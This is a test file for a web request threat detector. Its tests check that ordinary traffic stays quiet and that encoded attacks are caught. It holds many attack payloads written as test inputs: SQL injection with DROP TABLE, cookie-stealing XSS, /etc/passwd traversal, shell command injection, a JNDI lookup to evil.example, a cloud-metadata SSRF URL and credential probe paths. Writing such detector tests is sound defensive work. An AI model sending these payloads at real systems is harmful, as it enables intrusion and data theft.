import { describe, expect, it } from 'vitest';

import { detectThreats, normalizeForScan, scanText } from '../src/threat/detect.ts';
import { RULES } from '../src/threat/signatures.ts';
import { SEVERITY_BY_KIND, THREAT_KINDS } from '../src/threat/types.ts';

/**
 * The detector runs on every request to the customer's site, so it is judged on
 * three things and in this order:
 *
 *   1. It does not fire on real traffic. A feed with one wrong entry in it is a
 *      feed nobody opens again, and then the real attack scrolls past unread.
 *   2. It fires on real attacks, including the encoded forms that are what
 *      actually arrives rather than the textbook ones.
 *   3. It cannot be made slow. It is in someone else's hot path.
 */

const req = (pathname: string, search?: string, userAgent?: string) =>
  detectThreats({ pathname, search, userAgent });

const kinds = (pathname: string, search?: string, ua?: string) => req(pathname, search, ua).map((m) => m.kind);

// ── 1. Silence on ordinary traffic ─────────────────────────────────────────

describe('a normal request produces nothing', () => {
  const ORDINARY: ReadonlyArray<readonly [string, string | undefined]> = [
    ['/', undefined],
    ['/about', undefined],
    ['/dashboard', '?tab=settings'],
    ['/api/users/42', undefined],
    ['/blog/how-we-select-candidates', undefined],
    // "select" and "from" as prose, which the naive rule would have flagged.
    ['/search', '?q=how%20to%20select%20rows%20from%20a%20table'],
    ['/search', '?q=drop%20me%20a%20line'],
    ['/products', '?sort=price&order=asc&page=3'],
    // A hyphenated slug, which looks like a SQL comment to a careless matcher.
    ['/posts/the-2024-2025-season--recap', undefined],
    ['/api/orders', '?status=shipped&from=2026-01-01&to=2026-02-01'],
    // An apostrophe in a real name.
    ['/search', "?q=O'Brien"],
    ['/u/o%27connor', undefined],
    // A relative-looking but single-level path.
    ['/docs/../guide', undefined],
    // Legitimate redirect parameters.
    ['/login', '?next=/dashboard'],
    ['/oauth/callback', '?code=abc123&state=xyz'],
    // Maths in a query, which is not template injection without the braces.
    ['/calc', '?expr=7*7'],
    // A JSON body path and a file download.
    ['/api/export.json', undefined],
    ['/files/report-2026.pdf', undefined],
    // French/German text with accents, percent-encoded.
    ['/blog/%C3%BCber-uns', undefined],
    ['/recherche', '?q=caf%C3%A9%20%26%20cr%C3%A8me'],
  ];

  for (const [pathname, search] of ORDINARY) {
    it(`stays quiet for ${pathname}${search ?? ''}`, () => {
      expect(kinds(pathname, search)).toEqual([]);
    });
  }

  it('does not treat a real browser as tooling', () => {
    const chrome =
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
    expect(kinds('/', undefined, chrome)).toEqual([]);
  });

  it('does not treat a legitimate crawler as tooling', () => {
    for (const ua of [
      'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
      'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
      'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
      'Mozilla/5.0 (compatible; Applebot/0.1)',
    ]) {
      expect(kinds('/', undefined, ua)).toEqual([]);
    }
  });
});

// ── 2. Recognising what actually arrives ───────────────────────────────────

describe('SQL injection', () => {
  it('catches the classic union probe', () => {
    expect(kinds('/products', "?id=1' UNION SELECT null,version()--")).toContain('sql_injection');
  });

  it('catches it URL-encoded, which is the form that really arrives', () => {
    expect(kinds('/products', '?id=1%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--')).toContain(
      'sql_injection',
    );
  });

  it('catches it double-encoded, past a filter that decodes once', () => {
    expect(kinds('/products', '?id=1%2527%2520union%2520select%25201')).toContain('sql_injection');
  });

  it('catches `+` as a space, which is how a query string encodes one', () => {
    expect(kinds('/products', '?id=1+union+select+1')).toContain('sql_injection');
  });

  it('catches a tautology in any quoting style', () => {
    expect(kinds('/login', "?u=admin'%20or%20'1'='1")).toContain('sql_injection');
    expect(kinds('/api/item', '?id=5 OR 1=1')).toContain('sql_injection');
    expect(kinds('/api/item', '?id=5 or "a"="a"')).toContain('sql_injection');
  });

  it('does not call an ordinary "or" a tautology', () => {
    expect(kinds('/search', '?q=cats or dogs')).toEqual([]);
    expect(kinds('/search', '?q=3 or 4 items')).toEqual([]);
  });

  it('catches time-based blind probes', () => {
    expect(kinds('/api/item', '?id=1;SELECT pg_sleep(10)--')).toContain('sql_injection');
    expect(kinds('/api/item', "?id=1' AND SLEEP(5)--")).toContain('sql_injection');
  });

  it('catches schema enumeration', () => {
    expect(kinds('/api/item', '?id=-1 UNION SELECT table_name FROM information_schema.tables')).toContain(
      'sql_injection',
    );
  });

  it('catches destructive statements', () => {
    expect(kinds('/api/item', "?id=1'; DROP TABLE users;--")).toContain('sql_injection');
  });

  it('sees through inline-comment obfuscation', () => {
    expect(kinds('/api/item', '?id=1/**/union/**/select/**/1')).toContain('sql_injection');
  });
});

describe('NoSQL injection', () => {
  it('catches operator injection in a query string', () => {
    expect(kinds('/api/login', '?user[$ne]=&pass[$ne]=')).toContain('nosql_injection');
  });

  it('catches a JSON operator payload', () => {
    expect(kinds('/api/find', '?filter={"$where":"1==1"}')).toContain('nosql_injection');
  });
});

describe('cross-site scripting', () => {
  it('catches a script tag', () => {
    expect(kinds('/search', '?q=<script>alert(1)</script>')).toContain('xss');
  });

  it('catches it percent-encoded', () => {
    expect(kinds('/search', '?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E')).toContain('xss');
  });

  it('catches it HTML-entity encoded, which survives an escaping middleware', () => {
    expect(kinds('/search', '?q=&lt;script&gt;alert(1)&lt;/script&gt;')).toContain('xss');
  });

  it('catches an event handler on an image', () => {
    expect(kinds('/profile', '?bio=<img src=x onerror=alert(1)>')).toContain('xss');
  });

  it('catches an svg onload', () => {
    expect(kinds('/profile', '?bio=<svg/onload=alert(1)>')).toContain('xss');
  });

  it('does not flag prose that merely mentions a script', () => {
    expect(kinds('/search', '?q=how to write a script for a video')).toEqual([]);
  });
});

describe('path traversal', () => {
  it('catches a climb out of the web root', () => {
    expect(kinds('/api/file', '?name=../../../../etc/passwd')).toContain('path_traversal');
  });

  it('catches it encoded', () => {
    expect(kinds('/api/file', '?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd')).toContain('path_traversal');
  });

  it('catches the Windows variant', () => {
    expect(kinds('/api/file', '?name=..\\..\\windows\\win.ini')).toContain('path_traversal');
  });

  it('catches a null-byte truncation attempt', () => {
    expect(kinds('/api/file', '?name=avatar.png%00.php')).toContain('path_traversal');
  });

  it('does not flag a single relative segment', () => {
    expect(kinds('/docs/../readme', undefined)).toEqual([]);
  });
});

describe('command and code injection', () => {
  it('catches a chained shell command', () => {
    expect(kinds('/api/ping', '?host=8.8.8.8;cat /etc/hosts')).toContain('command_injection');
  });

  it('catches command substitution', () => {
    expect(kinds('/api/ping', '?host=$(whoami)')).toContain('command_injection');
  });

  it('catches a JNDI lookup, wherever it is sent', () => {
    expect(kinds('/', '?x=${jndi:ldap://evil.example/a}')).toContain('code_injection');
    expect(kinds('/', undefined, '${jndi:ldap://evil.example/a}')).toContain('code_injection');
  });

  it('catches prototype pollution', () => {
    expect(kinds('/api/merge', '?__proto__[isAdmin]=true')).toContain('code_injection');
  });
});

describe('template injection and SSRF', () => {
  it('catches the arithmetic probe', () => {
    expect(kinds('/render', '?name={{7*7}}')).toContain('template_injection');
    expect(kinds('/render', '?name=${7*7}')).toContain('template_injection');
  });

  it('catches a reach for cloud metadata', () => {
    expect(kinds('/api/fetch', '?url=http://169.254.169.254/latest/meta-data/')).toContain('ssrf');
  });

  it('catches a file scheme', () => {
    expect(kinds('/api/fetch', '?url=file:///etc/passwd')).toContain('ssrf');
  });
});

describe('configuration probing', () => {
  const PROBES = [
    '/.env',
    '/.git/config',
    '/wp-login.php',
    '/wp-admin/setup-config.php',
    '/phpmyadmin/index.php',
    '/backup.sql',
    '/actuator/env',
    '/.aws/credentials',
    '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/_ignition/execute-solution',
  ];

  for (const path of PROBES) {
    it(`flags ${path}`, () => {
      expect(kinds(path)).toContain('secret_probe');
    });
  }

  it('only fires on the path, not on a query parameter that names one', () => {
    // A blog post about .env files must not read as somebody probing for one.
    expect(kinds('/blog/dotenv-tips', '?ref=/.env')).not.toContain('secret_probe');
  });
});

describe('attack tooling', () => {
  it('names the tool when it announces itself', () => {
    for (const ua of ['sqlmap/1.7.2#stable (http://sqlmap.org)', 'Mozilla/5.0 (Nikto/2.5.0)', 'Nuclei - Open-source']) {
      expect(kinds('/', undefined, ua)).toContain('scanner');
    }
  });
});

// ── 3. Shape of the output ─────────────────────────────────────────────────

describe('what gets reported', () => {
  it('reports the worst class first', () => {
    const matches = req('/x', "?a=<script>alert(1)</script>&b=1' UNION SELECT 1--");
    expect(matches[0]?.kind).toBe('sql_injection');
    expect(SEVERITY_BY_KIND[matches[0]!.kind]).toBe('critical');
  });

  it('never reports the same request more than three ways', () => {
    const matches = req(
      '/x',
      "?a=<script>alert(1)</script>&b=1' UNION SELECT 1--&c=../../etc/passwd&d=$(id)&e=${jndi:ldap://e}&f={{7*7}}",
    );
    expect(matches.length).toBeLessThanOrEqual(3);
  });

  it('reports one event per attack class, not one per rule', () => {
    const matches = req('/x', "?id=1' UNION SELECT null FROM information_schema.tables--");
    expect(matches.filter((m) => m.kind === 'sql_injection')).toHaveLength(1);
  });

  it('carries evidence that shows the payload', () => {
    const match = req('/x', '?q=<script>alert(1)</script>')[0];
    expect(match?.evidence).toContain('<script');
    expect(match?.evidence.length).toBeLessThanOrEqual(130);
  });

  it('takes anything credential-shaped out of the evidence', () => {
    const long = 'a'.repeat(40);
    const match = req('/x', `?token=${long}&q=<script>`)[0];
    expect(match?.evidence).not.toContain(long);
  });

  it('names a surface and a rule for every match', () => {
    for (const match of req('/x', "?id=1' or 1=1")) {
      expect(['path', 'query', 'header', 'user_agent']).toContain(match.surface);
      expect(match.ruleId).toMatch(/^[a-z0-9.\-]+$/);
      expect(['certain', 'likely']).toContain(match.confidence);
    }
  });
});

// ── 4. It cannot be turned into a weapon ───────────────────────────────────

describe('safety of the detector itself', () => {
  it('survives malformed percent-encoding instead of throwing', () => {
    expect(() => req('/x', '?q=%zz%%%2')).not.toThrow();
    expect(() => req('/%E0%A4%A')).not.toThrow();
  });

  it('caps what it scans, so a giant URL cannot be used to burn CPU', () => {
    const huge = 'a'.repeat(200_000);
    const start = Date.now();
    const matches = req(`/${huge}`, `?q=${huge}`, huge);
    expect(Date.now() - start).toBeLessThan(250);
    expect(matches).toEqual([]);
  });

  it('stays fast on a pathological repetition, which is where a bad regex hangs', () => {
    // Classic catastrophic-backtracking bait. Every pattern in the catalogue is
    // linear, so this must finish in microseconds rather than minutes.
    for (const payload of ['a'.repeat(5_000), "'".repeat(3_000), '<'.repeat(3_000), '../'.repeat(1_000)]) {
      const start = Date.now();
      req('/x', `?q=${payload}`);
      expect(Date.now() - start).toBeLessThan(150);
    }
  });

  it('returns an empty list rather than throwing when a header getter explodes', () => {
    const matches = detectThreats({
      pathname: '/x',
      header: () => {
        throw new Error('boom');
      },
    });
    expect(matches).toEqual([]);
  });

  it('handles an empty request without inventing a finding', () => {
    expect(detectThreats({ pathname: '' })).toEqual([]);
    expect(scanText('', 'query')).toEqual([]);
  });
});

// ── 5. The catalogue itself ────────────────────────────────────────────────

describe('rule catalogue invariants', () => {
  it('matches against lowercased text, so no literal may carry uppercase', () => {
    // A rule with an uppercase literal silently never fires. The bug is
    // invisible in review and invisible at runtime; only this test sees it.
    for (const rule of RULES) {
      for (const literal of [...(rule.all ?? []), ...(rule.any ?? [])]) {
        expect(literal, rule.id).toBe(literal.toLowerCase());
      }
    }
  });

  it('gives every rule a kind the server will accept', () => {
    for (const rule of RULES) {
      expect(THREAT_KINDS, rule.id).toContain(rule.kind);
    }
  });

  it('uses unique rule ids', () => {
    const ids = RULES.map((r) => r.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('gives every rule something to match on', () => {
    for (const rule of RULES) {
      expect(Boolean(rule.all || rule.any || rule.re), rule.id).toBe(true);
    }
  });

  it('assigns a severity to every kind that can be reported', () => {
    for (const kind of THREAT_KINDS) {
      expect(SEVERITY_BY_KIND[kind], kind).toBeTruthy();
    }
  });

  it('keeps every regex free of the nesting that causes catastrophic backtracking', () => {
    for (const rule of RULES) {
      if (!rule.re) continue;
      // A quantified group that itself contains a quantifier is the shape that
      // hangs. Nothing in this catalogue may have one.
      expect(rule.re.source, rule.id).not.toMatch(/\([^)]*[+*][^)]*\)\s*[+*]/);
    }
  });
});

describe('normalizeForScan', () => {
  it('decodes, lowercases and collapses whitespace', () => {
    expect(normalizeForScan('%55NION%09%0aSELECT', 100)).toBe('union select');
  });

  it('respects the cap it is given', () => {
    expect(normalizeForScan('x'.repeat(500), 50)).toHaveLength(50);
  });

  it('keeps a null byte, which is itself the signal', () => {
    expect(normalizeForScan('a%00b', 100)).toContain(' ');
  });
});
